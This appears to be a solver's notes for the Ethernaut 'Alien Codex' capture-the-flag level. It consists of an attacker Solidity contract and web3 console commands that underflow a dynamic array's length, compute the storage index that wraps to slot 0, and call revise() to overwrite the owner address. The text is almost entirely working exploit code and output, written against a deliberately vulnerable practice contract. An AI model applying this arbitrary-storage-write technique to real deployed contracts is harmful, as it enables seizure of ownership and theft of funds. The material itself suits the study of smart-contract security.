pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodex {
    address levelInstance;

    constructor(address _levelInstance) {
      levelInstance = _levelInstance;
    }

    function claim() public {
        unchecked{
            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
            IAlienCodex(levelInstance).revise(index, bytes32(uint256(uint160(msg.sender))));
        }
    }

}

await web3.eth.getStorageAt(contract.address,0)
'0x00000000000000000000000127bc920e7c426500a0e7d63bb037800a7288abc1'

await web3.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001")
'0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'

contract attacker {
    constructor() public {
    }

    function func1() public view returns (uint) {
        return 2**256 - 1 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1;
    }
}
35707666377435648211887908874984608119992236509074197713628505308453184860938

await contract.retract()

await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x000000000000000000000000d24eceF3AA9257383BD3341e63F6Cd73951186dF')

